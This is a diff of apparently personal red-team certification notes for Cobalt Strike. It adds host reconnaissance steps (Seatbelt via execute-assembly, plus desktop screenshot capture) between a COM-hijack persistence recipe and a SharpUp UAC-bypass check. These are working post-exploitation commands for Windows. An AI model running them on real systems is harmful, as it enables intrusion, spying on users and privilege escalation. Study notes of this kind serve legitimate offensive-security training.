@@ -134,6 +134,17 @@ PS : [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('
 10. Next command `New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{9FC8E510-A27C-4B3B-B9A3-BF65F00256A8}\InprocServer32" -Name "ThreadingModel" -Value "Both"`
 11. now when **MS Edge (internet explorer)** is loaded, you should get a **beacon**. 
 
+### Host reconnaissance 
+#### via seatbelt.exe
+1. `execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe -group=system`
+2. `execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe -group=user`
+
+#### via screenshots
+1. Take a single screenshot via PrintScr method ---> `printscreen`
+2. Take a single screenshot ---> `screenshot`
+3. Take periodic screenshots of desktop ---> `screenwatch`
+4. Go to **View** and click **Screenshots** to view the SS.
+
 ### Windows Privilege Escalation - UAC Bypass
 1. First run the SharpUp.exe via command `execute-assembly /opt/CRTO/SharpUp.exe audit`
 2. If you see some error like **In medium integrity but user is a local administrator - UAC can be bypassed.** Then this attack **may** be successful. 
